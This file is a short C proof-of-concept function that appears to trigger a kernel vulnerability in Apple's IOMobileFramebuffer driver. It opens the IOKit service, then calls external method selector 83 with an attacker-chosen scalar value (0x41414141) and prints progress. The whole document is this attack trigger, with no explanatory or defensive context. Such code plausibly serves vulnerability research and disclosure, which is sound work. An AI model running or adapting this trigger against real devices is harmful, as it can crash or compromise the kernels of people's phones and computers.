void trigger_clcd_vuln(void) {
  kern_return_t ret;
  io_connect_t shared_user_client_conn = MACH_PORT_NULL;
  int type = 2;
  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                            IOServiceMatching("IOMobileFramebuffer"));
   
  if(service == MACH_PORT_NULL) {
    printf("failed to open service\n");
    return;
  }
   
  printf("service: 0x%x\n", service);

  ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
  if(ret != KERN_SUCCESS) {
    printf("failed to open userclient: %s\n", mach_error_string(ret));
    return;
  }
   
  printf("client: 0x%x\n", shared_user_client_conn);
   
  printf("call externalMethod\n");
  uint64_t scalars[4] = { 0x0 };
  scalars[0] = 0x41414141;

  uint64_t output_scalars[4] = { 0 };
  uint32_t output_scalars_size = 1;

  printf("call s_default_fb_surface\n");
  ret = IOConnectCallMethod(shared_user_client_conn, 83,
           scalars, 1,
    	      NULL, 0, //input, input_size,
    		  output_scalars, &output_scalars_size,
        	  NULL, NULL); //output, &output_size);

  if(ret != KERN_SUCCESS) {
    printf("failed to call external method: 0x%x --> %s\n", ret, mach_error_string(ret));
    return;
  }
   
  printf("external method returned KERN_SUCCESS\n");
   
  IOServiceClose(shared_user_client_conn);
  printf("success!\n");
}